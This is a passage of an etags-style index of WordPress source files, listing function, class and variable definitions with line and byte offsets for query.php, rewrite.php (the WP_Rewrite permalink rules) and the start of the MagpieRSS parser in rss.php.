		$tag_obj = $this->get_queried_object();tag_obj3155,83410
		$slug = (array) $slug;slug3157,83453
	 * If the $taxonomy parameter is specified, this function will additionallywill3168,83614
	 * this function will additionally check if the query is for one of the termswill3172,83830
	function is_tax( $taxonomy = '', $term = '' ) {is_tax3181,84126
	function is_tax( $taxonomy = '', $term = '' ) {taxonomy3181,84126
		$queried_object = $this->get_queried_object();queried_object3190,84288
		$tax_array = array_intersect( array_keys( $wp_taxonomies ), (array) $taxonomy );tax_array3191,84337
		$term_array = (array) $term;term_array3192,84420
	function is_comments_popup() {is_comments_popup3211,84930
	function is_date() {is_date3222,85097
	function is_day() {is_day3233,85243
	function is_feed( $feeds = '' ) {is_feed3245,85441
	function is_feed( $feeds = '' ) {feeds3245,85441
		$qv = $this->get( 'feed' );qv3248,85554
			$qv = get_default_feed();qv3250,85607
	function is_comment_feed() {is_comment_feed3261,85772
	 * If you set a static page for the front page of your site, this function will returnwill3272,86073
	function is_front_page() {is_front_page3283,86363
	 * If you set a static page for the front page of your site, this function will returnwill3300,86913
	function is_home() {is_home3309,87170
	function is_month() {is_month3320,87318
	 * If the $page parameter is specified, this function will additionallywill3327,87423
	function is_page( $page = '' ) {is_page3338,87732
	function is_page( $page = '' ) {page3338,87732
		$page_obj = $this->get_queried_object();page_obj3345,87850
		$page = (array) $page;page3347,87894
	function is_paged() {is_paged3366,88253
	function is_preview() {is_preview3377,88410
	function is_robots() {is_robots3388,88564
	function is_search() {is_search3399,88709
	 * If the $post parameter is specified, this function will additionallywill3408,88878
	function is_single( $post = '' ) {is_single3419,89185
	function is_single( $post = '' ) {post3419,89185
		$post_obj = $this->get_queried_object();post_obj3426,89305
		$post = (array) $post;post3428,89349
	 * If the $post_types parameter is specified, this function will additionallywill3443,89686
	function is_singular( $post_types = '' ) {is_singular3454,90012
	function is_singular( $post_types = '' ) {post_types3454,90012
		$post_obj = $this->get_queried_object();post_obj3458,90147
	function is_time() {is_time3470,90349
	function is_trackback() {is_trackback3481,90507
	function is_year() {is_year3492,90665
	function is_404() {is_4043503,90820
	function is_main_query() {is_main_query3514,90961
		return $wp_the_query === $this;wp_the_query3516,91013
function wp_old_slug_redirect() {wp_old_slug_redirect3531,91281
			$post_type = get_query_var('post_type');post_type3538,91503
			$post_type = 'page';post_type3540,91602
			$post_type = 'post';post_type3542,91633
			$post_type = array_shift( $post_type );post_type3547,91738
		$query = $wpdb->prepare("SELECT post_id FROM $wpdb->postmeta, $wpdb->posts WHERE ID = post_id AND post_type = %s AND meta_key = '_wp_old_slug' AND meta_value = %s", $post_type, $wp_query->query_vars['name']);query3554,91904
		$id = (int) $wpdb->get_var($query);id3565,92679
		$link = get_permalink($id);link3570,92745
function setup_postdata($post) {setup_postdata3589,93050
	$id = (int) $post->ID;id3592,93183
	$authordata = get_userdata($post->post_author);authordata3594,93208
	$currentday = mysql2date('d.m.y', $post->post_date, false);currentday3596,93258
	$currentmonth = mysql2date('m', $post->post_date, false);currentmonth3597,93319
	$numpages = 1;numpages3598,93378
	$page = get_query_var('page');page3599,93394
		$page = 1;page3601,93441
		$more = 1;more3603,93500
	$content = $post->post_content;content3604,93513
			$more = 1;more3607,93613
		$multipage = 1;multipage3608,93627
		$content = str_replace("\n<!--nextpage-->\n", '<!--nextpage-->', $content);content3609,93645
		$content = str_replace("\n<!--nextpage-->", '<!--nextpage-->', $content);content3610,93723
		$content = str_replace("<!--nextpage-->\n", '<!--nextpage-->', $content);content3611,93799
		$pages = explode('<!--nextpage-->', $content);pages3612,93875
		$numpages = count($pages);numpages3613,93924
		$pages = array( $post->post_content );pages3615,93963
		$multipage = 0;multipage3616,94004

wordpress/wp-includes/registration-functions.php,0

wordpress/wp-includes/registration.php,0

wordpress/wp-includes/rewrite.php,24893
function add_rewrite_rule($regex, $redirect, $after = 'bottom') {add_rewrite_rule19,413
function add_rewrite_rule($regex, $redirect, $after = 'bottom') {after19,413
function add_rewrite_tag( $tag, $regex, $query = '' ) {add_rewrite_tag38,1124
function add_rewrite_tag( $tag, $regex, $query = '' ) {query38,1124
		$qv = trim( $tag, '%' );qv46,1352
		$query = $qv . '=';query48,1408
function add_permastruct( $name, $struct, $args = array() ) {add_permastruct65,1852
function add_permastruct( $name, $struct, $args = array() ) {args65,1852
		$args = array( 'with_front' => $args );args70,2041
function add_feed($feedname, $function) {add_feed86,2411
	$hook = 'do_feed_' . $feedname;hook90,2589
	// Remove default function hookhook91,2622
function flush_rewrite_rules( $hard = true ) {flush_rewrite_rules106,3012
function flush_rewrite_rules( $hard = true ) {hard106,3012
define('EP_NONE', 0);EP_NONE116,3194
define('EP_PERMALINK', 1);EP_PERMALINK123,3276
define('EP_ATTACHMENT', 2);EP_ATTACHMENT130,3364
define('EP_DATE', 4);EP_DATE137,3447
define('EP_YEAR', 8);EP_YEAR144,3523
define('EP_MONTH', 16);EP_MONTH151,3601
define('EP_DAY', 32);EP_DAY158,3679
define('EP_ROOT', 64);EP_ROOT165,3756
define('EP_COMMENTS', 128);EP_COMMENTS172,3838
define('EP_SEARCH', 256);EP_SEARCH179,3925
define('EP_CATEGORIES', 512);EP_CATEGORIES186,4012
define('EP_TAGS', 1024);EP_TAGS193,4097
define('EP_AUTHORS', 2048);EP_AUTHORS200,4180
define('EP_PAGES', 4096);EP_PAGES207,4264
define('EP_ALL', 8191);EP_ALL214,4351
function add_rewrite_endpoint( $name, $places ) {add_rewrite_endpoint247,5551
function _wp_filter_taxonomy_base( $base ) {_wp_filter_taxonomy_base263,5897
		$base = preg_replace( '|^/index\.php/|', '', $base );base265,5968
		$base = trim( $base, '/' );base266,6024
function url_to_postid($url) {url_to_postid281,6308
	$url = apply_filters('url_to_postid', $url);url284,6361
		$id = absint($values[2]);id288,6561
	$rewrite = $wp_rewrite->wp_rewrite_rules();rewrite294,6668
	$url_split = explode('#', $url);url_split301,6873
	$url = $url_split[0];url302,6907
	$url_split = explode('?', $url);url_split305,6964
	$url = $url_split[0];url306,6998
		$url = str_replace('://', '://www.', $url);url310,7158
		$url = str_replace('://www.', '://', $url);url314,7304
		$url = str_replace('index.php/', '', $url);url318,7461
		$url = str_replace(home_url(), '', $url);url322,7585
		$home_path = parse_url(home_url());home_path325,7667
		$home_path = isset( $home_path['path'] ) ? $home_path['path'] : '' ;home_path326,7705
		$url = str_replace($home_path, '', $url);url327,7776
	$url = trim($url, '/');url331,7861
	$request = $url;request333,7887
	$request_match = $request;request_match336,7928
	foreach ( (array)$rewrite as $match => $query) {match337,7956
			$request_match = $url . '/' . $request;request_match342,8173
			$query = preg_replace("!^.+\?!", '', $query);query354,8614
			$query = addslashes(WP_MatchesMapRegex::apply($query, $matches));query357,8719
			$query = array();query362,8878
			foreach ( (array) $query_vars as $key => $value ) {key363,8899
			$query = new WP_Query($query);query369,9057
 * The WordPress Rewrite class writes the rewrite module rules to the .htaccesswrites382,9257
 * The Rewrite along with WP class function as a front controller for WordPress.function386,9444
 * The Rewrite along with WP class function as a front controller for WordPress.as386,9444
class WP_Rewrite {WP_Rewrite394,9783
	var $permalink_structure;permalink_structure402,9904
	var $use_trailing_slashes;use_trailing_slashes411,10034
	var $author_base = 'author';author_base420,10213
	var $author_base = 'author';author_base420,10213
	var $author_structure;author_structure429,10356
	var $date_structure;date_structure438,10491
	var $page_structure;page_structure447,10616
	var $search_base = 'search';search_base456,10783
	var $search_base = 'search';search_base456,10783
	var $search_structure;search_structure465,10919
	var $comments_base = 'comments';comments_base474,11040
	var $comments_base = 'comments';comments_base474,11040
	var $pagination_base = 'page';pagination_base483,11173
	var $pagination_base = 'page';pagination_base483,11173
	var $feed_base = 'feed';feed_base492,11298
	var $feed_base = 'feed';feed_base492,11298
	var $comments_feed_structure;comments_feed_structure501,11431
	var $feed_structure;feed_structure510,11568
	var $front;front524,11915
	var $root = '';root539,12294
	var $root = '';root539,12294
	var $index = 'index.php';index548,12451
	var $index = 'index.php';index548,12451
	var $matches = '';matches557,12613
	var $matches = '';matches557,12613
	var $rules;rules566,12778
	var $extra_rules = array();extra_rules577,12982
	var $extra_rules = array();extra_rules577,12982
	var $extra_rules_top = array();extra_rules_top588,13210
	var $extra_rules_top = array();extra_rules_top588,13210
	var $non_wp_rules = array();non_wp_rules600,13492
	var $non_wp_rules = array();non_wp_rules600,13492
	var $extra_permastructs = array();extra_permastructs609,13674
	var $extra_permastructs = array();extra_permastructs609,13674
	var $endpoints;endpoints618,13851
	var $use_verbose_rules = false;use_verbose_rules631,14165
	var $use_verbose_rules = false;use_verbose_rules631,14165
	var $use_verbose_page_rules = true;use_verbose_page_rules649,14850
	var $use_verbose_page_rules = true;use_verbose_page_rules649,14850
	var $rewritecode = array(rewritecode664,15280
	var $rewritecode = array(rewritecode664,15280
	var $rewritereplace = array(rewritereplace686,15660
	var $rewritereplace = array(rewritereplace686,15660
	var $queryreplace = array(queryreplace707,16014
	var $queryreplace = array(queryreplace707,16014
	var $feeds = array( 'feed', 'rdf', 'rss', 'rss2', 'atom' );feeds728,16274
	var $feeds = array( 'feed', 'rdf', 'rss', 'rss2', 'atom' );feeds728,16274
	function using_permalinks() {using_permalinks740,16560
	function using_index_permalinks() {using_index_permalinks754,16861
	function using_mod_rewrite_permalinks() {using_mod_rewrite_permalinks775,17339
	function preg_index($number) {preg_index798,18077
		$match_prefix = '$';match_prefix799,18109
		$match_suffix = '';match_suffix800,18132
			$match_prefix = '$' . $this->matches . '[';match_prefix803,18190
			$match_suffix = ']';match_suffix804,18237
	function page_uri_index() {page_uri_index821,18609
		$posts = get_page_hierarchy( $wpdb->get_results("SELECT ID, post_name, post_parent FROM $wpdb->posts WHERE post_type = 'page' AND post_status != 'auto-draft'") );posts825,18720
		$posts = array_reverse($posts, true);posts832,19074
		$page_uris = array();page_uris834,19115
		$page_attachment_uris = array();page_attachment_uris835,19139
		foreach ( $posts as $id => $post ) {id837,19175
			$uri = get_page_uri($id);uri839,19237
			$attachments = $wpdb->get_results( $wpdb->prepare( "SELECT ID, post_name, post_parent FROM $wpdb->posts WHERE post_type = 'attachment' AND post_parent = %d", $id ));attachments840,19266
					$attach_uri = get_page_uri($attachment->ID);attach_uri843,19514
	function page_rewrite_rules() {page_rewrite_rules862,19845
	function get_date_permastruct() {get_date_permastruct889,21013
			$this->date_structure = '';date_structure894,21165
		$endians = array('%year%/%monthnum%/%day%', '%day%/%monthnum%/%year%', '%monthnum%/%day%/%year%');endians899,21295
		$this->date_structure = '';date_structure901,21397
		$date_endian = '';date_endian902,21427
				$date_endian= $endian;date_endian906,21551
			$date_endian = '%year%/%monthnum%/%day%';date_endian912,21628
		$front = $this->front;front916,21812
		$tok_index = 1;tok_index918,21903
				$front = $front . 'date/';front921,22020
		$this->date_structure = $front . $date_endian;date_structure927,22089
	function get_year_permastruct() {get_year_permastruct943,22464
		$structure = $this->get_date_permastruct();structure944,22499
		$structure = str_replace('%monthnum%', '', $structure);structure949,22591
		$structure = str_replace('%day%', '', $structure);structure950,22649
		$structure = preg_replace('#/+#', '/', $structure);structure952,22703
	function get_month_permastruct() {get_month_permastruct968,23109
		$structure = $this->get_date_permastruct();structure969,23145
		$structure = str_replace('%day%', '', $structure);structure974,23237
		$structure = preg_replace('#/+#', '/', $structure);structure976,23291
	function get_day_permastruct() {get_day_permastruct991,23636
	function get_category_permastruct() {get_category_permastruct1008,24165
	function get_tag_permastruct() {get_tag_permastruct1025,24674
	function get_extra_permastruct($name) {get_extra_permastruct1038,24987
	function get_author_permastruct() {get_author_permastruct1060,25582
			$this->author_structure = '';author_structure1065,25740
		$this->author_structure = $this->front . $this->author_base . '/%author%';author_structure1069,25795
	function get_search_permastruct() {get_search_permastruct1086,26279
			$this->search_structure = '';search_structure1091,26437
		$this->search_structure = $this->root . $this->search_base . '/%search%';search_structure1095,26492
	function get_page_permastruct() {get_page_permastruct1112,26951
			$this->page_structure = '';page_structure1117,27101
		$this->page_structure = $this->root . '%pagename%';page_structure1121,27154
	function get_feed_permastruct() {get_feed_permastruct1138,27605
			$this->feed_structure = '';feed_structure1143,27757
		$this->feed_structure = $this->root . $this->feed_base . '/%feed%';feed_structure1147,27810
	function get_comment_feed_permastruct() {get_comment_feed_permastruct1164,28315
			$this->comment_feed_structure = '';comment_feed_structure1169,28489
		$this->comment_feed_structure = $this->root . $this->comments_base . '/' . $this->feed_base . '/%feed%';comment_feed_structure1173,28550
	function add_rewrite_tag( $tag, $regex, $query ) {add_rewrite_tag1194,29276
		$position = array_search( $tag, $this->rewritecode );position1195,29328
	 * The main WP_Rewrite function for building the rewrite rule list. Thefor1209,29718
	 * contents of the function is a mix of black magic and regular expressions,is1210,29791
	function generate_rewrite_rules($permalink_structure, $ep_mask = EP_NONE, $paged = true, $feed = true, $forcomments = false, $walk_dirs = true, $endpoints = true) {generate_rewrite_rules1226,30769
	function generate_rewrite_rules($permalink_structure, $ep_mask = EP_NONE, $paged = true, $feed = true, $forcomments = false, $walk_dirs = true, $endpoints = true) {ep_mask1226,30769
		$feedregex2 = '';feedregex21228,31026
		$feedregex2 = '(' . trim($feedregex2, '|') . ')/?$';feedregex21231,31130
		$feedregex = $this->feed_base . '/' . $feedregex2;feedregex1235,31326
		$trackbackregex = 'trackback/?$';trackbackregex1238,31447
		$pageregex = $this->pagination_base . '/?([0-9]{1,})/?$';pageregex1239,31483
		$commentregex = 'comment-page-([0-9]{1,})/?$';commentregex1240,31543
			$ep_query_append = array ();ep_query_append1244,31688
				$epmatch = $endpoint[1] . '(/(.*))?/?$';epmatch1247,31860
				$epquery = '&' . $endpoint[1] . '=';epquery1249,31974
		$front = substr($permalink_structure, 0, strpos($permalink_structure, '%'));front1255,32139
		$num_tokens = count($tokens[0]);num_tokens1259,32361
		$index = $this->index; //probably 'index.php'index1261,32397
		$feedindex = $index;feedindex1262,32445
		$trackbackindex = $index;trackbackindex1263,32468
		for ( $i = 0; $i < $num_tokens; ++$i ) {i1266,32639
			$query_token = str_replace($this->rewritecode, $this->queryreplace, $tokens[0][$i]) . $this->preg_index($i+1);query_token1272,32774
		$structure = $permalink_structure;structure1277,33002
			$structure = str_replace($front, '', $structure);structure1279,33062
		$structure = trim($structure, '/');structure1284,33357
		$dirs = $walk_dirs ? explode('/', $structure) : array( $structure );dirs1285,33395
		$num_dirs = count($dirs);num_dirs1286,33466
		$front = preg_replace('|^/+|', '', $front);front1289,33538
		$post_rewrite = array();post_rewrite1292,33613
		$struct = $front;struct1293,33640
		for ( $j = 0; $j < $num_dirs; ++$j ) {j1294,33660
			$struct = ltrim($struct, '/');struct1297,33859
			$match = str_replace($this->rewritecode, $this->rewritereplace, $struct);match1300,33925
			$num_toks = preg_match_all('/%.+?%/', $struct, $toks);num_toks1303,34071
			$query = ( isset($queries) && is_array($queries) && !empty($num_toks) ) ? $queries[$num_toks - 1] : '';query1306,34165
					$ep_mask_specific = EP_YEAR;ep_mask_specific1311,34395
					$ep_mask_specific = EP_MONTH;ep_mask_specific1314,34464
					$ep_mask_specific = EP_DAY;ep_mask_specific1317,34529
					$ep_mask_specific = EP_NONE;ep_mask_specific1320,34587
			$pagematch = $match . $pageregex;pagematch1324,34658
			$pagequery = $index . '?' . $query . '&paged=' . $this->preg_index($num_toks + 1);pagequery1325,34695
			$commentmatch = $match . $commentregex;commentmatch1328,34821
			$commentquery = $index . '?' . $query . '&cpage=' . $this->preg_index($num_toks + 1);commentquery1329,34864
				$rootcommentmatch = $match . $commentregex;rootcommentmatch1333,35039
				$rootcommentquery = $index . '?' . $query . '&page_id=' . get_option('page_on_front') . '&cpage=' . $this->preg_index($num_toks + 1);rootcommentquery1334,35087
			$feedmatch = $match . $feedregex;feedmatch1338,35284
			$feedquery = $feedindex . '?' . $query . '&feed=' . $this->preg_index($num_toks + 1);feedquery1339,35321
			$feedmatch2 = $match . $feedregex2;feedmatch21342,35501
			$feedquery2 = $feedindex . '?' . $query . '&feed=' . $this->preg_index($num_toks + 1);feedquery21343,35540
			$rewrite = array();rewrite1352,35855
				$rewrite = array($feedmatch => $feedquery, $feedmatch2 => $feedquery2);rewrite1354,35935
				$rewrite = array_merge($rewrite, array($pagematch => $pagequery));rewrite1356,36051
				$rewrite = array_merge($rewrite, array($commentmatch => $commentquery));rewrite1360,36237
				$rewrite = array_merge($rewrite, array($rootcommentmatch => $rootcommentquery));rewrite1362,36379
				foreach ( (array) $ep_query_append as $regex => $ep) {regex1366,36506
				$post = false;post1375,36845
				$page = false;page1376,36864
					$post = true;post1387,37620
						$page = true;page1389,37691
							$post = true;post1396,37935
							$page = is_post_type_hierarchical( $ptype ); // This is for page style attachment url'spage1397,37956
					$trackbackmatch = $match . $trackbackregex;trackbackmatch1406,38239
					$trackbackquery = $trackbackindex . '?' . $query . '&tb=1';trackbackquery1407,38288
					$match = rtrim($match, '/');match1409,38412
					$submatchbase = str_replace( array('(', ')'), '', $match);submatchbase1411,38473
					$sub1 = $submatchbase . '/([^/]+)/';sub11414,38621
					$sub1tb = $sub1 . $trackbackregex; //add trackback regex <permalink>/trackback/...sub1tb1415,38663
					$sub1feed = $sub1 . $feedregex; //and <permalink>/feed/(atom|...)sub1feed1416,38751
					$sub1feed2 = $sub1 . $feedregex2; //and <permalink>/(feed|atom...)sub1feed21417,38822
					$sub1comment = $sub1 . $commentregex; //and <permalink>/comment-page-xxsub1comment1418,38894
					$sub2 = $submatchbase . '/attachment/([^/]+)/';sub21422,39079
					$sub2tb = $sub2 . $trackbackregex; //and add trackbacks <permalink>/attachment/trackbacksub2tb1423,39132
					$sub2feed = $sub2 . $feedregex;    //feeds, <permalink>/attachment/feed/(atom|...)sub2feed1424,39226
					$sub2feed2 = $sub2 . $feedregex2;  //and feeds again on to this <permalink>/attachment/(feed|atom...)sub2feed21425,39314
					$sub2comment = $sub2 . $commentregex; //and <permalink>/comment-page-xxsub2comment1426,39421
					$subquery = $index . '?attachment=' . $this->preg_index(1);subquery1429,39567
					$subtbquery = $subquery . '&tb=1';subtbquery1430,39632
					$subfeedquery = $subquery . '&feed=' . $this->preg_index(2);subfeedquery1431,39672
					$subcommentquery = $subquery . '&cpage=' . $this->preg_index(2);subcommentquery1432,39738
						foreach ( (array) $ep_query_append as $regex => $ep ) {regex1436,39878
					$match = $match . '(/[0-9]+)?/?$';match1451,40441
					$query = $index . '?' . $query . '&page=' . $this->preg_index($num_toks + 1);query1452,40481
					$query = $index . '?' . $query;query1456,40696
				$rewrite = array_merge($rewrite, array($match => $query));rewrite1462,40932
					$rewrite = array_merge(array($trackbackmatch => $trackbackquery), $rewrite);rewrite1467,41111
						$rewrite = array_merge($rewrite, array($sub1 => $subquery, $sub1tb => $subtbquery, $sub1feed => $subfeedquery, $sub1feed2 => $subfeedquery, $sub1comment => $subcommentquery));rewrite1471,41379
					$rewrite = array_merge(array($sub2 => $subquery, $sub2tb => $subtbquery, $sub2feed => $subfeedquery, $sub2feed2 => $subfeedquery, $sub2comment => $subcommentquery), $rewrite);rewrite1472,41561
			$post_rewrite = array_merge($rewrite, $post_rewrite);post_rewrite1476,41835
	function generate_rewrite_rule($permalink_structure, $walk_dirs = false) {generate_rewrite_rule1496,42607
	function generate_rewrite_rule($permalink_structure, $walk_dirs = false) {walk_dirs1496,42607
	function rewrite_rules() {rewrite_rules1518,43496
		$rewrite = array();rewrite1519,43524
		$home_path = parse_url( home_url() );home_path1525,43658
		$robots_rewrite = ( empty( $home_path['path'] ) || '/' == $home_path['path'] ) ? array( 'robots\.txt$' => $this->index . '?robots=1' ) : array();robots_rewrite1526,43698
		$old_feed_files = array( '.*wp-(atom|rdf|rss|rss2|feed|commentsrss2)\.php$' => $this->index . '?feed=old' );old_feed_files1529,43867
		$registration_pages = array();registration_pages1532,44003
		$post_rewrite = $this->generate_rewrite_rules( $this->permalink_structure, EP_PERMALINK );post_rewrite1540,44344
		$post_rewrite = apply_filters('post_rewrite_rules', $post_rewrite);post_rewrite1541,44437
		$date_rewrite = $this->generate_rewrite_rules($this->get_date_permastruct(), EP_DATE);date_rewrite1544,44518
		$date_rewrite = apply_filters('date_rewrite_rules', $date_rewrite);date_rewrite1545,44607
		$root_rewrite = $this->generate_rewrite_rules($this->root . '/', EP_ROOT);root_rewrite1548,44688
		$root_rewrite = apply_filters('root_rewrite_rules', $root_rewrite);root_rewrite1549,44765
		$comments_rewrite = $this->generate_rewrite_rules($this->root . $this->comments_base, EP_COMMENTS, true, true, true, false);comments_rewrite1552,44850
		$comments_rewrite = apply_filters('comments_rewrite_rules', $comments_rewrite);comments_rewrite1553,44977
		$search_structure = $this->get_search_permastruct();search_structure1556,45072
		$search_rewrite = $this->generate_rewrite_rules($search_structure, EP_SEARCH);search_rewrite1557,45127
		$search_rewrite = apply_filters('search_rewrite_rules', $search_rewrite);search_rewrite1558,45208
		$author_rewrite = $this->generate_rewrite_rules($this->get_author_permastruct(), EP_AUTHORS);author_rewrite1561,45298
		$author_rewrite = apply_filters('author_rewrite_rules', $author_rewrite);author_rewrite1562,45394
		$page_rewrite = $this->page_rewrite_rules();page_rewrite1565,45482
		$page_rewrite = apply_filters('page_rewrite_rules', $page_rewrite);page_rewrite1566,45529
		foreach ( $this->extra_permastructs as $permastructname => $struct ) {permastructname1569,45624
					$rules = $this->generate_rewrite_rules( $struct[0], $struct[1] );rules1572,45762
					$rules = $this->generate_rewrite_rules( $struct['struct'], $struct['ep_mask'], $struct['paged'], $struct['feed'], $struct['forcomments'], $struct['walk_dirs'], $struct['endpoints'] );rules1574,45842
				$rules = $this->generate_rewrite_rules( $struct );rules1576,46043
			$rules = apply_filters($permastructname . '_rewrite_rules', $rules);rules1579,46104
				$rules = apply_filters('tag_rewrite_rules', $rules);rules1581,46217
			$this->extra_rules_top = array_merge($this->extra_rules_top, $rules);extra_rules_top1583,46275
			$this->rules = array_merge($this->extra_rules_top, $robots_rewrite, $old_feed_files, $registration_pages, $root_rewrite, $comments_rewrite, $search_rewrite,  $author_rewrite, $date_rewrite, $page_rewrite, $post_rewrite, $this->extra_rules);rules1588,46416
			$this->rules = array_merge($this->extra_rules_top, $robots_rewrite, $old_feed_files, $registration_pages, $root_rewrite, $comments_rewrite, $search_rewrite,  $author_rewrite, $date_rewrite, $post_rewrite, $page_rewrite, $this->extra_rules);rules1590,46667
		$this->rules = apply_filters('rewrite_rules_array', $this->rules);rules1593,46976
	function wp_rewrite_rules() {wp_rewrite_rules1612,47487
		$this->rules = get_option('rewrite_rules');rules1613,47518
			$this->matches = 'matches';matches1615,47595
	function mod_rewrite_rules() {mod_rewrite_rules1637,48102
		$site_root = parse_url(get_option('siteurl'));site_root1641,48186
			$site_root = trailingslashit($site_root['path']);site_root1643,48272
		$home_root = parse_url(home_url());home_root1645,48326
			$home_root = trailingslashit($home_root['path']);home_root1647,48401
			$home_root = '/';home_root1649,48461
		$rules = "<IfModule mod_rewrite.c>\n";rules1651,48483
		foreach ( (array) $this->non_wp_rules as $match => $query) {match1657,48786
			$match = str_replace('.+?', '.+', $match);match1659,48920
			//if ($match == '(.+)/?$' || $match == '([^/]+)/?$' ) {match1663,49102
			$this->matches = '';matches1671,49304
			$rewrite = $this->rewrite_rules();rewrite1672,49328
			$num_rules = count($rewrite);num_rules1673,49366
			foreach ( (array) $rewrite as $match => $query) {match1678,49547
				$match = str_replace('.+?', '.+', $match);match1680,49672
				//if ($match == '(.+)/?$' || $match == '([^/]+)/?$' ) {match1684,49857
		$rules = apply_filters('mod_rewrite_rules', $rules);rules1701,50372
		$rules = apply_filters('rewrite_rules', $rules);  // Deprecatedrules1702,50427
	function iis7_url_rewrite_rules( $add_parent_tags = false ) {iis7_url_rewrite_rules1718,50780
	function iis7_url_rewrite_rules( $add_parent_tags = false ) {add_parent_tags1718,50780
		$rules = '';rules1722,50895
		$rules = apply_filters('iis7_url_rewrite_rules', $rules);rules1806,54033
	function add_rule($regex, $redirect, $after = 'bottom') {add_rule1824,54535
	function add_rule($regex, $redirect, $after = 'bottom') {after1824,54535
		$index = (strpos($redirect, '?') == false ? strlen($redirect) : strpos($redirect, '?'));index1826,54631
		$front = substr($redirect, 0, $index);front1827,54722
				$this->extra_rules = array_merge($this->extra_rules, array($regex => $redirect));extra_rules1832,54924
				$this->extra_rules_top = array_merge($this->extra_rules_top, array($regex => $redirect));extra_rules_top1834,55018
	function add_external_rule($regex, $redirect) {add_external_rule1850,55454
	function add_endpoint($name, $places) {add_endpoint1867,55907
	function add_permastruct( $name, $struct, $args = array() ) {add_permastruct1901,57837
	function add_permastruct( $name, $struct, $args = array() ) {args1901,57837
			$args = array( 'with_front' => $args );args1904,58007
		$defaults = array(defaults1908,58122
		$args = array_intersect_key( $args, $defaults );args1917,58312
		$args = wp_parse_args( $args, $defaults );args1918,58363
			$struct = $this->front . $struct;struct1921,58438
			$struct = $this->root . $struct;struct1923,58482
	 * 'rewrite_rules' option. If the function named 'save_mod_rewrite_rules'named1933,58733
	function flush_rules($hard = true) {flush_rules1940,59021
	function init() {init1959,59595
		$this->extra_rules = $this->non_wp_rules = $this->endpoints = array();extra_rules1960,59614
		$this->permalink_structure = get_option('permalink_structure');permalink_structure1961,59687
		$this->front = substr($this->permalink_structure, 0, strpos($this->permalink_structure, '%'));front1962,59753
		$this->root = '';root1963,59850
			$this->root = $this->index . '/';root1965,59911
		$this->use_trailing_slashes = ( '/' == substr($this->permalink_structure, -1, 1) );use_trailing_slashes1972,60152
			 $this->use_verbose_page_rules = true;use_verbose_page_rules1976,60423
			$this->use_verbose_page_rules = false;use_verbose_page_rules1978,60472
	function set_permalink_structure($permalink_structure) {set_permalink_structure1996,61020
	function set_category_base($category_base) {set_category_base2016,61702
	function set_tag_base( $tag_base ) {set_tag_base2035,62230
	function __construct() {__construct2050,62512

wordpress/wp-includes/rss-functions.php,0

wordpress/wp-includes/rss.php,11941
define('RSS', 'RSS');RSS26,510
define('ATOM', 'Atom');ATOM27,532
define('MAGPIE_USER_AGENT', 'WordPress/' . $GLOBALS['wp_version']);MAGPIE_USER_AGENT28,556
class MagpieRSS {MagpieRSS30,625
	var $parser;parser31,643
	var $current_item	= array();	// item currently being parsedcurrent_item32,657
	var $current_item	= array();	// item currently being parsedcurrent_item32,657
	var $items			= array();	// collection of parsed itemsitems33,718
	var $items			= array();	// collection of parsed itemsitems33,718
	var $channel		= array();	// hash of channel fieldschannel34,773
	var $channel		= array();	// hash of channel fieldschannel34,773
	var $textinput		= array();textinput35,825
	var $textinput		= array();textinput35,825
	var $image			= array();image36,853
	var $image			= array();image36,853
	var $feed_type;feed_type37,878
	var $feed_version;feed_version38,895
	var $stack				= array(); // parser stackstack41,937
	var $stack				= array(); // parser stackstack41,937
	var $inchannel			= false;inchannel42,979
	var $inchannel			= false;inchannel42,979
	var $initem 			= false;initem43,1006
	var $initem 			= false;initem43,1006
	var $incontent			= false; // if in Atom <content mode="xml"> fieldincontent44,1031
	var $incontent			= false; // if in Atom <content mode="xml"> fieldincontent44,1031
	var $intextinput		= false;intextinput45,1099
	var $intextinput		= false;intextinput45,1099
	var $inimage 			= false;inimage46,1127
	var $inimage 			= false;inimage46,1127
	var $current_field		= '';current_field47,1153
	var $current_field		= '';current_field47,1153
	var $current_namespace	= false;current_namespace48,1180
	var $current_namespace	= false;current_namespace48,1180
	//var $ERROR = "";ERROR50,1214
	var $_CONTENT_CONSTRUCTS = array('content', 'summary', 'info', 'title', 'tagline', 'copyright');_CONTENT_CONSTRUCTS52,1235
	var $_CONTENT_CONSTRUCTS = array('content', 'summary', 'info', 'title', 'tagline', 'copyright');_CONTENT_CONSTRUCTS52,1235
	function MagpieRSS ($source) {MagpieRSS54,1334
		$parser = @xml_parser_create();parser61,1557
		$this->parser = $parser;parser66,1737
		$status = xml_parse( $this->parser, $source );status77,2038
			$errorcode = xml_get_error_code( $this->parser );errorcode80,2108
				$xml_error = xml_error_string( $errorcode );xml_error82,2202
				$error_line = xml_get_current_line_number($this->parser);error_line83,2251
				$error_col = xml_get_current_column_number($this->parser);error_col84,2313
				$errormsg = "$xml_error at line $error_line, column $error_col";errormsg85,2376
	function feed_start_element($p, $element, &$attrs) {feed_start_element96,2550
		$el = $element = strtolower($element);el97,2604
		$attrs = array_change_key_case($attrs, CASE_LOWER);attrs98,2645
		$ns	= false;ns101,2747
			$this->current_namespace = $ns;current_namespace106,2879
			if ( $el == 'rdf' ) {el113,3057
				$this->feed_type = RSS;feed_type114,3082
				$this->feed_version = '1.0';feed_version115,3110
			elseif ( $el == 'rss' ) {el117,3148
				$this->feed_type = RSS;feed_type118,3177
				$this->feed_version = $attrs['version'];feed_version119,3205
			elseif ( $el == 'feed' ) {el121,3255
				$this->feed_type = ATOM;feed_type122,3285
				$this->feed_version = $attrs['version'];feed_version123,3314
				$this->inchannel = true;inchannel124,3359
		if ( $el == 'channel' )el129,3409
			$this->inchannel = true;inchannel131,3439
		elseif ($el == 'item' or $el == 'entry' )el133,3471
			$this->initem = true;initem135,3519
			$this->feed_type == RSS andfeed_type144,3754
			$this->current_namespace == '' andcurrent_namespace145,3785
			$el == 'textinput' )el146,3823
			$this->intextinput = true;intextinput148,3851
			$this->feed_type == RSS andfeed_type152,3897
			$this->current_namespace == '' andcurrent_namespace153,3928
			$el == 'image' )el154,3966
			$this->inimage = true;inimage156,3990
		elseif ( $this->feed_type == ATOM and in_array($el, $this->_CONTENT_CONSTRUCTS) )feed_type160,4056
				$el = 'atom_content';el164,4212
			$this->incontent = $el;incontent167,4244
			$attrs_str = join(' ',attrs_str175,4471
		elseif ($this->feed_type == ATOM and $el == 'link' )el189,4872
				$link_el = 'link';link_el193,5000
				$link_el = 'link_' . $attrs['rel'];link_el196,5038
	function feed_cdata ($p, $text) {feed_cdata207,5223
			$current_el = join('_', array_reverse($this->stack));current_el214,5364
	function feed_end_element ($p, $el) {feed_end_element219,5467
		$el = strtolower($el);el220,5506
